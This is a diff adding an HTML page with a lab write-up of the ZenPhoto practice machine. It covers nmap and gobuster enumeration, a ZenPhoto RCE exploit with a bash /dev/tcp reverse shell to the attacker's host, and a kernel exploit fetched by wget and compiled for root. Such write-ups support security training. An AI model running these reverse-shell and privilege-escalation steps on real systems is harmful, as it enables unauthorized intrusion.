@@ -1,0 +1,164 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">PG Practice : ZenPhoto</h1>
+    <p class="text">Difficulty : Intermediate | CommunityRating : Intermediate | MyRating : Intermediate | ClearTime 1h30min</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/zenphoto]
+└─$ sudo nmap -p- -sCV $IP --min-rate=10000
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-17 20:15 EST
+Warning: 192.168.151.41 giving up on port because retransmission cap hit (10).
+Nmap scan report for 192.168.151.41
+Host is up (0.13s latency).
+Not shown: 50830 closed tcp ports (reset), 14701 filtered tcp ports (no-response)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)
+|_  2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)
+23/tcp   open  ipp     CUPS 1.4
+|_http-server-header: CUPS/1.4
+| http-methods: 
+|_  Potentially risky methods: PUT
+|_http-title: 403 Forbidden
+80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
+|_http-server-header: Apache/2.2.14 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+3306/tcp open  mysql   MySQL (unauthorized)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+
+<p class="text">There are two interesting open ports : 23 and 3306, but both are rabbit hole. We can find a vector to get initial access from http.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/zenphoto/1.png' %}" alt="">
+    <p class="text">Opening the first page, I could see sentence 'under construction'. It often include vulnerability in this case.</p>
+</div>
+
+<p class="text">To find interesting path which is under development, I enumerated directories with gobuster.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/zenphoto]
+└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.151.41 -t 70       
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.151.41
+[+] Method:                  GET
+[+] Threads:                 70
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.htpasswd            (Status: 403) [Size: 291]
+/.hta                 (Status: 403) [Size: 286]
+/.htaccess            (Status: 403) [Size: 291]
+/cgi-bin/             (Status: 403) [Size: 290]
+/index.html           (Status: 200) [Size: 75]
+/index                (Status: 200) [Size: 75]
+/test                 (Status: 301) [Size: 315] [--> http://192.168.151.41/test/]
+/server-status        (Status: 403) [Size: 295]
+Progress: 4746 / 4746 (100.00%)
+===============================================================</code></pre></div>
+
+<p class="text">There is a find directory.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/zenphoto/2.png' %}" alt="">
+    <p class="text">Opening /test/ directory, I found running application  'ZenPhoto'. Searching vulnerability revealed <a href="https://www.exploit-db.com/exploits/18083">RCE vulnerability</a>.</p>
+</div>
+
+<p class="text">Using this PoC code, I could get reverse shell.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/zenphoto]
+└─$ php exploit.php 192.168.151.41 /test/
+
++-----------------------------------------------------------+
+| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |
++-----------------------------------------------------------+
+
+zenphoto-shell# bash -c 'bash -i &lt;& /dev/tcp/192.168.45.249/4444 0&lt;&1'</code></pre></div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/zenphoto]
+└─$ rlwrap nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.249] from (UNKNOWN) [192.168.151.41] 50464
+bash: no job control in this shell
+&lt;p-extensions/tiny_mce/plugins/ajaxfilemanager/inc$ script /dev/null -c /bin/bash
+&lt;ins/ajaxfilemanager/inc$</code></pre></div>
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">The kernel version on the target machine is really old, which would hold vulnerability.</p>
+<div class="code-box"><pre><code>root@offsecsrv:/tmp/exp#  uname -a
+Linux offsecsrv 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux</code></pre></div>
+
+<p class="text">I found <a href="https://www.exploit-db.com/exploits/15704">this poc</a>. I installed it and upload it to the target machine.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/zenphoto/exp]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</code></pre></div>
+
+<div class="code-box"><pre><code>www-data@offsecsrv:/tmp/exp$ wget http://192.168.45.249/exploit.c
+www-data@offsecsrv:/tmp/exp$ gcc exploit.c -o exploit
+www-data@offsecsrv:/tmp/exp$ ./exploit
+[*] Resolving kernel addresses...
+ [+] Resolved econet_ioctl to 0xf82232d0
+ [+] Resolved econet_ops to 0xf82233c0
+ [+] Resolved commit_creds to 0xc016dcc0
+ [+] Resolved prepare_kernel_cred to 0xc016e000
+[*] Calculating target...
+[*] Failed to set Econet address.
+[*] Triggering payload...
+[*] Got root!
+# 
+id
+</code></pre></div>
+
+<p class="text">Though it returned shell once, the shell was not stable. Therefore, I needed to change poc code just a little bit.</p>
+<p class="text">The original code of this poc uses below code to generate bash:</p>
+<div class="code-box"><pre><code>        printf("[*] Got root!\n");
+        execl("/bin/sh", "/bin/sh", NULL);
+}</code></pre></div>
+<p class="text">I replaced the two /bin/sh statement into /bin/bash.</p>
+<div class="code-box"><pre><code>        printf("[*] Got root!\n");
+        execl("/bin/bash", "/bin/bash", NULL);
+}</code></pre></div>
+
+<p class="text">Then, I re-uploaded this file to the target machine and construct, then run genereated file.</p>
+<div class="code-box"><pre><code>www-data@offsecsrv:/tmp/exp$ wget http://192.168.45.249/this.c
+--2025-12-18 02:56:51--  http://192.168.45.249/this.c
+Connecting to 192.168.45.249:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 9495 (9.3K) [text/x-csrc]
+Saving to: `this.c'
+
+100%[======================================>] 9,495       --.-K/s   in 0.1s    
+
+2025-12-18 02:56:51 (91.6 KB/s) - `this.c' saved [9495/9495]</code></pre></div>
+<div class="code-box"><pre><code>www-data@offsecsrv:/tmp/exp$ gcc this.c -o this</code></pre></div>
+<div class="code-box"><pre><code>www-data@offsecsrv:/tmp/exp$ ./this
+[*] Resolving kernel addresses...
+ [+] Resolved econet_ioctl to 0xf82232d0
+ [+] Resolved econet_ops to 0xf82233c0
+ [+] Resolved commit_creds to 0xc016dcc0
+ [+] Resolved prepare_kernel_cred to 0xc016e000
+[*] Calculating target...
+[*] Failed to set Econet address.
+[*] Triggering payload...
+[*] Got root!
+root@offsecsrv:/tmp/exp# id
+uid=0(root) gid=0(root)</code></pre></div>
+
+<p class="text">I got root shell.</p>
+
+
+</body>
+</html>
